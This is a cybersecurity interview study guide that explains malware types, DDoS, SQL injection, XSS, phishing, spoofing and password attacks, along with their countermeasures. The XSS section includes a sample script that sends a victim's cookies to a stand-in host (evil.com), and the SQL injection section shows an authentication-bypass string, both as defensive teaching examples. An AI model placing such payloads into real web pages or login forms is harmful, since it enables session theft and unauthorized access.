---
title: "Study Guide Part3 Attacks Threats Countermeasures"
category: "Security Engineer"
tags: ["SOC"]
lastUpdated: "2026-06-05"
---

# 📘 Part 3: Attacks, Threats & Countermeasures

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: Malware, DoS/DDoS, MITM, SQL Injection, XSS, Phishing, Spoofing, Password Attacks, Secure Coding

---

## Table of Contents

1. [Malware Types & Prevention](#1-malware-types--prevention)
2. [DoS & DDoS Attacks](#2-dos--ddos-attacks)
3. [SQL Injection Attacks](#3-sql-injection-attacks)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Phishing Attacks](#5-phishing-attacks)
6. [Spoofing Attacks](#6-spoofing-attacks)
7. [Password Attacks](#7-password-attacks)
8. [Secure Coding Best Practices](#8-secure-coding-best-practices)
9. [Interview Questions & Answers](#9-interview-questions--answers)
10. [Quick Reference Tables](#10-quick-reference-tables)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. Malware Types & Prevention

### What is Malware?
**Malware** (malicious software) is software designed to harm, exploit, or compromise computer systems, networks, and devices. It enters systems through email attachments, software downloads, malicious websites, compromised networks, and infected USB devices.

### Types of Malware

#### 1. Viruses
- **Attach to legitimate files** and replicate by embedding their code
- Spread when the **infected file is executed**
- Can corrupt/delete files, disrupt operations
- **Examples:** ILOVEYOU (2000, spread via email), Melissa (1999, infected Word documents)

#### 2. Worms
- **Self-replicate independently** across networks
- **Do NOT require user interaction** — exploit vulnerabilities automatically
- Consume network resources, create backdoors
- **Examples:** SQL Slammer (2003, targeted SQL Server), MyDoom (2004, email worm, launched DDoS)

#### 3. Trojans (Trojan Horses)
- **Disguise as legitimate programs** to deceive users
- **Cannot self-replicate** — rely on social engineering
- Create backdoors, steal data, deliver other malware
- **Types:** RAT (Remote Access Trojan — gives remote control)
- **Examples:** Zeus/Zbot (2007, stole banking credentials)

#### 4. Ransomware
- **Encrypts victim's files** and demands ransom for decryption key
- Primary purpose: **financial extortion**
- **Examples:** WannaCry (2017, exploited Windows vulnerability, demanded Bitcoin), Ryuk (targeted organizations)

#### 5. Spyware
- **Secretly monitors** user activities and collects data
- Gathers: keystrokes, browsing habits, credentials
- **Examples:** Pegasus (advanced smartphone surveillance), WebWatcher (commercial monitoring)

#### 6. Adware
- Displays **unwanted advertisements**
- Often bundled with free software downloads
- Some forms collect data without consent
- **Examples:** Superfish (pre-installed on laptops), CrossRider (browser extension ads)

#### 7. Rootkits
- Provide **hidden unauthorized access** at root/admin level
- Designed to maintain **persistent, undetected** control
- **Examples:** Sony BMG Rootkit (2005, hidden on music CDs), ZeroAccess (botnet, click fraud)

#### 8. Botnets
- **Network of compromised devices** controlled by a command & control (C2) server
- Devices called **bots/zombies**, controlled by **bot master**
- Used for: DDoS attacks, spam emails, crypto mining
- **Examples:** Emotet (banking trojans via phishing), GameOver Zeus (financial fraud)

#### 9. Keyloggers
- **Record every keystroke** — capture passwords, credit cards, personal data
- Can be **software** (malicious download) or **hardware** (physical USB device)
- **Examples:** HawkEye (commercial keylogger), KeySweeper (USB charger disguise)

#### 10. Fileless Malware
- Operates **entirely in memory** — leaves no files on disk
- Exploits **legitimate system tools** (PowerShell, WMI)
- Evades traditional antivirus that scans files
- **Examples:** Living Off The Land (LOLBin attacks using PowerShell), PowerGhost (fileless crypto miner)

### Malware Comparison Table

| Malware | Self-Replicates? | User Interaction? | Primary Purpose |
|---------|-----------------|-------------------|-----------------|
| Virus | ✅ Yes | ✅ Required (execute file) | Spread & damage |
| Worm | ✅ Yes | ❌ Not needed | Spread via network |
| Trojan | ❌ No | ✅ Required (install) | Backdoor access |
| Ransomware | ❌ No | ✅ Required | Financial extortion |
| Spyware | ❌ No | ❌/✅ Varies | Data collection |
| Rootkit | ❌ No | ❌/✅ Varies | Persistent hidden access |
| Botnet | ✅ Via malware | ❌/✅ Varies | Coordinated attacks |
| Keylogger | ❌ No | ❌/✅ Varies | Credential theft |
| Fileless | ❌ No | ❌/✅ Varies | Evade detection |

### Malware Countermeasures
1. **Security Policies & Procedures** — Comprehensive malware prevention policies
2. **User Training** — Phishing awareness, safe browsing, recognize suspicious content
3. **Least Privilege** — Restrict user access to minimum necessary
4. **Network Security** — Firewalls, IDS/IPS, network segmentation
5. **Email Security** — Filtering, DMARC, SPF, DKIM
6. **Endpoint Security** — Antivirus, anti-malware, real-time scanning
7. **Patch Management** — Regular updates, automated patching
8. **Secure Configuration** — Disable unnecessary features/services
9. **Backup & Recovery** — Regular backups in isolated environments
10. **Incident Response Plan** — Documented steps for malware outbreaks
11. **MDM** — Mobile Device Management for organization devices
12. **Continuous Monitoring** — SIEM tools, network traffic analysis
13. **Regular Security Assessments** — Penetration testing, vulnerability assessments

---

## 2. DoS & DDoS Attacks

### DoS (Denial of Service)
- Attack from a **single source** aimed at making a service **unavailable**
- Overwhelms the target with traffic or exploits vulnerabilities

### DDoS (Distributed Denial of Service)
- Attack from **multiple sources** (usually a botnet)
- Much harder to mitigate than DoS due to distributed nature

### Types of DDoS Attacks

#### Volume-Based Attacks (Layer 3-4)
| Attack | Description |
|--------|-------------|
| **UDP Flood** | Sends massive UDP packets to random ports; server checks for applications and responds with ICMP "Destination Unreachable" |
| **ICMP Flood** | Overwhelms target with ICMP echo requests (ping) |
| **Amplification** | Uses open DNS/NTP servers to amplify traffic toward target |

#### Protocol-Based Attacks (Layer 3-4)
| Attack | Description |
|--------|-------------|
| **TCP SYN Flood** | Exploits the TCP handshake — sends SYN packets but never completes the handshake, exhausting server resources |
| **Ping of Death** | Sends oversized ICMP packets that crash the target system |
| **Smurf Attack** | Sends ICMP requests with spoofed source IP to broadcast address |

#### Application Layer Attacks (Layer 7)
| Attack | Description |
|--------|-------------|
| **HTTP Flood** | Sends massive HTTP GET/POST requests that appear legitimate |
| **Slowloris** | Opens connections and keeps them alive as long as possible with partial requests |

### DDoS Mitigation Strategies
1. **Web Application Firewall (WAF)** — Filter malicious HTTP traffic
2. **Content Delivery Network (CDN)** — Distribute traffic across global nodes
3. **Rate Limiting** — Limit requests per IP per time period
4. **Traffic Scrubbing** — Route traffic through scrubbing centers to filter attacks
5. **Load Balancing** — Distribute traffic across multiple servers
6. **Black Hole Routing** — Route attack traffic to a null route
7. **ISP-Level Filtering** — Upstream provider blocks malicious traffic
8. **Anycast Network Diffusion** — Distribute traffic across global network

---

## 3. SQL Injection Attacks

### What is SQL Injection?
A code injection technique that **exploits vulnerabilities in web applications** that interact with databases. Attackers insert malicious SQL code through input fields to manipulate the database.

### How SQL Injection Works
```
Normal Login:
SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'

SQL Injection:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
                                      ↑ Always TRUE — bypasses authentication
```

### Types of SQL Injection

| Type | Description |
|------|-------------|
| **In-Band (Classic)** | Attacker uses the same channel to launch attack and gather results |
| **Error-Based** | Forces the database to produce error messages containing useful data |
| **Union-Based** | Uses UNION SQL operator to combine results from multiple queries |
| **Blind SQL Injection** | No visible error messages — attacker asks true/false questions |
| **Boolean-Based Blind** | Uses conditional responses (page renders differently based on true/false) |
| **Time-Based Blind** | Uses time delays (e.g., SLEEP) to infer data |
| **Out-of-Band** | Uses different channel to retrieve data (e.g., DNS or HTTP requests) |

### SQL Injection Countermeasures
1. **Input Validation** — Validate and sanitize all user inputs
2. **Parameterized Queries / Prepared Statements** — Separate SQL code from data
3. **Stored Procedures** — Pre-compiled SQL in the database
4. **Web Application Firewall (WAF)** — Block malicious SQL patterns
5. **Least Privilege** — Database accounts with minimum permissions
6. **Error Handling** — Generic error messages (never reveal DB structure)
7. **Regular Security Testing** — Penetration testing, code reviews
8. **ORM Frameworks** — Use Object-Relational Mapping to abstract SQL

---

## 4. Cross-Site Scripting (XSS)

### What is XSS?
A web security vulnerability where attackers inject **malicious scripts (usually JavaScript)** into web pages viewed by other users. The browser executes the script because it trusts the website.

### Types of XSS

| Type | Description | Persistence |
|------|-------------|------------|
| **Stored (Persistent)** | Malicious script is stored on the server (in a database, comment field, forum post) and served to every user who visits the page | Permanent — affects all visitors |
| **Reflected (Non-Persistent)** | Script is embedded in a URL/link; executed when victim clicks the crafted link; server reflects the script back in the response | Temporary — requires user to click link |
| **DOM-Based** | Script executes entirely in the browser by manipulating the DOM; server is not involved | Client-side only |

### XSS Attack Flow (Stored Example)
```
1. Attacker injects malicious script into a comment field:
   <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

2. Script is stored in the web application's database

3. When another user views the page, the browser executes the script

4. User's session cookie is sent to the attacker's server

5. Attacker uses the stolen cookie to hijack the user's session
```

### XSS Countermeasures
1. **Input Validation** — Validate all user inputs on the server side
2. **Output Encoding** — Encode data before rendering in HTML (escape special characters: `<`, `>`, `"`, `'`, `&`)
3. **Content Security Policy (CSP)** — HTTP header that restricts which scripts can execute
4. **HTTPOnly Cookies** — Prevent JavaScript from accessing session cookies
5. **WAF** — Web Application Firewall to detect and block XSS patterns
6. **Framework Security Features** — Use frameworks with built-in XSS protection
7. **Regular Security Testing** — Automated scanning and manual penetration testing

---

## 5. Phishing Attacks

### What is Phishing?
A **social engineering attack** where attackers deceive victims into revealing sensitive information by impersonating trustworthy entities.

### Why is Phishing So Effective?

#### Technical Gaps
- **IOC Update Delay** — Security tools lag behind new malicious domains/IPs
- **Personal Mailbox Access** — Users access unmanaged personal email from work
- **BYOD Policies** — Personal devices lack enterprise security controls
- **Easy Data Access** — LinkedIn, Wikipedia reveal names, roles, email formats

#### Human Behavior Exploitation
| Tactic | How It Works |
|--------|-------------|
| **Urgency** | "Your credit card is expiring soon!" |
| **Fear** | "Update this form by tomorrow or your salary will be delayed" |
| **Empathy** | "I met with an accident, need money urgently" |
| **Greed** | "$50 Amazon coupon — click here! Offer valid for 3 hours only" |
| **Confusion/Anger** | "You ordered something you didn't buy — click to cancel" |

#### Sophistication
- No malicious content needed — just convincing text and a fake invoice
- New domains used for 1-2 months then discarded — no time for IOC flagging
- Domain spoofing, impersonation, display name manipulation
- Phishing kits are cheap and widely available
- Ransomware-as-a-Service (RaaS) makes attacks accessible

### Types of Phishing

| Type | Description |
|------|-------------|
| **Spear Phishing** | Targeted at specific individuals/organizations |
| **Whaling** | Targeted at high-profile executives (CEO, CFO) |
| **Vishing** | Voice phishing via phone calls |
| **Smishing** | SMS phishing via text messages |
| **Clone Phishing** | Replica of legitimate email with malicious changes |
| **Email Spoofing** | Faking sender's email address |

### Key Insight
> **All it takes is ONE person** to click a malicious link, download a malicious attachment, or share confidential data. An attacker may send phishing emails to thousands, but only needs one success.

---

## 6. Spoofing Attacks

### What is Spoofing?
**Pretending to be someone or something you are not** in order to gain unauthorized access, trick users into revealing data, or carry out malicious activities.

### Types of Spoofing

#### 1. IP/Host Spoofing
- Manipulates IP address or hostname to appear as a trusted source
- Used to: bypass security, launch DDoS, gain unauthorized access
- **Countermeasures:** Network monitoring, strong authentication, packet inspection, encryption, IDPS

#### 2. Email Spoofing
- Manipulates the "From" field in email headers
- Used for: phishing, spreading malware, credential theft
- **Countermeasures:**
  - **SPF** (Sender Policy Framework) — Verifies email came from authorized server
  - **DKIM** (DomainKeys Identified Mail) — Verifies email content hasn't been tampered
  - **DMARC** (Domain-based Message Authentication) — Combines SPF + DKIM with policy enforcement
  - Email filtering, user awareness, MFA

#### 3. DNS Spoofing (DNS Cache Poisoning)
- Manipulates DNS to redirect users to malicious websites
- Attacker tricks DNS server into providing fake IP address
- **Countermeasures:** DNSSEC (cryptographic signatures), update DNS software, DNS monitoring/logging, DNS firewalls, secure DNS resolvers (Google DNS, Cloudflare)

#### 4. ARP Spoofing (ARP Poisoning)
- Sends fake ARP responses to redirect network traffic through attacker's machine
- Enables: traffic interception, eavesdropping, MITM attacks
- **Countermeasures:** Static ARP entries, ARP monitoring/detection, VLANs/network segmentation, encryption (SSL/TLS), NAC (Network Access Control)

#### 5. Caller ID Spoofing
- Manipulates caller ID to display a different phone number
- Used for: scams, impersonation, social engineering
- **Countermeasures:** Verify caller identity, call blocking services, caller ID apps, report to authorities

#### 6. Application Spoofing
- Creates fake apps that mimic legitimate ones
- **User Countermeasures:** Download from official stores, check reviews/ratings, verify developer, review permissions, use mobile security solutions
- **Developer Countermeasures:** Code signing, secure coding, tamper-proof protection, obfuscation, regular updates

---

## 7. Password Attacks

### Types of Password Attacks

| Attack | Method | Key Characteristic |
|--------|--------|-------------------|
| **Brute Force** | Try ALL possible combinations systematically | Exhaustive, time-consuming |
| **Dictionary** | Try a precompiled list of common words/passwords | Targeted, efficient |
| **Credential Stuffing** | Use stolen username/password pairs from data breaches on other services | Exploits password reuse |
| **Password Spraying** | Try a few common passwords against MANY accounts | Avoids account lockouts |
| **Phishing** | Social engineering to trick users into revealing passwords | Human-targeted |
| **Keylogging** | Record keystrokes to capture passwords | Stealthy, captures all input |

### How Each Attack Works

#### Brute Force
```
Tries: password → password1 → password12 → password123 → p@ssw0rd → ...
Until: Correct password found OR attack aborted
```

#### Dictionary Attack
```
Uses dictionary file: ["password", "123456", "admin", "qwerty", "winter", "summer"]
Tries each entry against the target account
```

#### Credential Stuffing
```
Data breach reveals: user@example.com / password123
Attacker tries same combo on: Gmail, Apple, bank, social media
If password is reused → Account compromised
```

#### Password Spraying
```
Password "Password123" tried against:
  user1 → user2 → user3 → user4 → ... → user50000
Then "Admin123" tried against all users
(Only 1-2 passwords per user to avoid lockout)
```

### Password Attack Countermeasures
1. **Strong Password Policies** — Minimum length, complexity requirements
2. **Multi-Factor Authentication (MFA)** — Second factor beyond password
3. **Account Lockout Policies** — Lock after N failed attempts
4. **Rate Limiting** — Limit login attempts per time period
5. **CAPTCHA** — Block automated login attempts
6. **Password Managers** — Unique password per service
7. **Monitoring & Alerting** — Detect unusual login patterns
8. **Breach Monitoring** — Check if credentials appear in known breaches
9. **Salted Hashing** — Hash + salt passwords; never store plaintext
10. **Security Awareness Training** — Educate on phishing and password hygiene

---

## 8. Secure Coding Best Practices

### Key Practices

| Practice | Description |
|----------|-------------|
| **Input Validation** | Validate all user inputs — check type, length, format, range. Acts as a gatekeeper to filter harmful data. Prevents SQL injection, XSS |
| **Secure Communication** | Use encryption (HTTPS, SSL/TLS) for data in transit. Establish encrypted connections between client and server |
| **Secure Libraries & Frameworks** | Use well-known, reputable, regularly updated libraries (e.g., OpenSSL, bcrypt). Don't write your own crypto |
| **Authentication & Authorization** | Implement strong auth mechanisms (MFA). Use RBAC for access control. Verify identity and enforce permissions |
| **Secure Password Storage** | Hash passwords with salt. Use bcrypt/Argon2. NEVER store passwords in plaintext |
| **No Hardcoded Secrets** | Never hardcode passwords, API keys, or sensitive data in source code. Use environment variables |
| **Proper Error Handling** | Display generic error messages to users. Log detailed errors internally. Never reveal stack traces or server versions |
| **Regular Updates** | Keep all software, dependencies, frameworks updated with latest security patches |
| **Secure Deployment** | Use secure configurations, secure containers, minimize attack surface |
| **Security Testing** | Regular penetration testing, code reviews, automated security scanning |
| **Secure Third-Party Dependencies** | Evaluate security of external libraries. Monitor security advisories. Keep dependencies updated |
| **Awareness & Training** | Train developers on secure coding practices and security risks |

---

## 9. Interview Questions & Answers

### Q1: What is the difference between a virus and a worm?
**A:** A virus attaches to legitimate files and requires user interaction (executing the infected file) to spread. A worm self-replicates independently across networks without user interaction, exploiting vulnerabilities. Both are self-replicating malware, but worms are more dangerous because they spread automatically.

### Q2: How would you mitigate a DDoS attack?
**A:** I would use a multi-layered approach: Deploy a WAF to filter malicious HTTP traffic, use a CDN to distribute traffic globally, implement rate limiting to restrict requests per IP, enable traffic scrubbing through DDoS mitigation services, use load balancing to distribute traffic, and work with the ISP for upstream filtering. For long-term protection, implement anycast network diffusion.

### Q3: What is SQL injection and how do you prevent it?
**A:** SQL injection is a code injection attack where malicious SQL is inserted through input fields to manipulate the database. Prevention: use parameterized queries/prepared statements (separating SQL code from data), input validation, stored procedures, WAF, least-privilege database accounts, and generic error messages that don't reveal DB structure.

### Q4: Explain the three types of XSS.
**A:** Stored XSS — script is permanently stored on the server and served to all visitors. Reflected XSS — script is embedded in a URL and executed when the victim clicks the link; the server reflects it back. DOM-Based XSS — script executes entirely in the browser by manipulating the DOM; server isn't involved. Prevention for all: input validation, output encoding, CSP headers, HTTPOnly cookies.

### Q5: What is the difference between brute force, dictionary, credential stuffing, and password spraying?
**A:** Brute force tries ALL possible combinations against one account. Dictionary uses a precompiled wordlist. Credential stuffing uses stolen credentials from data breaches on other services (exploits password reuse). Password spraying tries a FEW common passwords against MANY accounts to avoid lockouts.

### Q6: What is fileless malware?
**A:** Fileless malware operates entirely in memory without leaving files on disk. It exploits legitimate system tools like PowerShell or WMI (called "Living Off The Land"). It evades traditional antivirus that scans files. Detection requires memory analysis, behavioral monitoring, and EDR solutions.

### Q7: Why is phishing still effective despite security training?
**A:** Multiple reasons: IOC update delays in security tools, personal device/email access bypassing corporate controls, easy data access from social media for targeted attacks, human psychology (urgency, fear, greed), sophisticated domain spoofing and impersonation, cheap phishing kits, and the fact that only ONE person needs to click.

### Q8: What are SPF, DKIM, and DMARC?
**A:** SPF (Sender Policy Framework) verifies that an email came from an authorized server. DKIM (DomainKeys Identified Mail) verifies the email content hasn't been tampered with using digital signatures. DMARC (Domain-based Message Authentication, Reporting & Conformance) combines SPF and DKIM with policy enforcement, telling receivers what to do with emails that fail checks.

### Q9: What is input validation and why is it important?
**A:** Input validation checks and verifies all data entered by users to ensure it's safe, valid, and in the expected format. It acts as a gatekeeper — only allowing expected data through. Examples: only numbers for age fields, email format validation, password complexity checks, file type/size restrictions. It prevents SQL injection, XSS, and data corruption.

### Q10: What is a rootkit and why is it dangerous?
**A:** A rootkit provides hidden unauthorized access at the root/admin level while remaining undetected. It's dangerous because it maintains persistent control, can hide from antivirus/OS, enables data theft and further attacks, and is extremely difficult to remove. Detection typically requires specialized rootkit scanners or system reimaging.

---

## 10. Quick Reference Tables

### Attack Types & OSI Layers

| Attack | Layer | Target |
|--------|-------|--------|
| DDoS (SYN Flood) | Layer 3-4 | Network/Transport |
| DDoS (HTTP Flood) | Layer 7 | Application |
| SQL Injection | Layer 7 | Application/Database |
| XSS | Layer 7 | Application/Browser |
| ARP Spoofing | Layer 2 | Data Link |
| IP Spoofing | Layer 3 | Network |
| DNS Spoofing | Layer 7 | Application |

### Malware Quick Reference

| Malware | Key Identifier | Spreads Via |
|---------|---------------|-------------|
| Virus | Attaches to files | File execution |
| Worm | Self-replicates | Network vulnerabilities |
| Trojan | Disguised as legitimate | Social engineering |
| Ransomware | Encrypts files, demands payment | Email, exploits |
| Spyware | Hidden monitoring | Bundled software |
| Rootkit | Hidden admin access | Exploits, physical access |
| Botnet | Network of bots + C2 server | Various malware |

### Email Security Protocols

| Protocol | Full Name | Purpose |
|----------|-----------|---------|
| SPF | Sender Policy Framework | Verify authorized sending server |
| DKIM | DomainKeys Identified Mail | Verify content integrity |
| DMARC | Domain-based Message Authentication | Combine SPF + DKIM + policy |

---

## 11. Key Takeaways

1. ✅ Know **all 10 malware types** — virus, worm, trojan, ransomware, spyware, adware, rootkit, botnet, keylogger, fileless
2. ✅ **Virus needs execution**, **worm is autonomous**, **trojan deceives**
3. ✅ **DDoS** = distributed from multiple sources; mitigate with WAF, CDN, rate limiting
4. ✅ **SQL Injection** → Use **parameterized queries** (most effective defense)
5. ✅ **XSS** → 3 types: Stored, Reflected, DOM-based → Use **output encoding + CSP**
6. ✅ **Phishing exploits human psychology** — urgency, fear, greed, confusion
7. ✅ **SPF + DKIM + DMARC** = email authentication trifecta
8. ✅ **Password Spraying** avoids lockouts by using few passwords across many accounts
9. ✅ **Fileless malware** lives in memory — needs EDR/behavioral detection
10. ✅ **Secure coding**: Input validation, parameterized queries, no hardcoded secrets, proper error handling

---

> 📌 **Previous:** [Part 2: Network Security & Cryptography](./Study_Guide_Part2_Network_Security_Cryptography.md)  
> 📌 **Next:** [Part 4: Security Frameworks & Models](./Study_Guide_Part4_Security_Frameworks_Models.md)
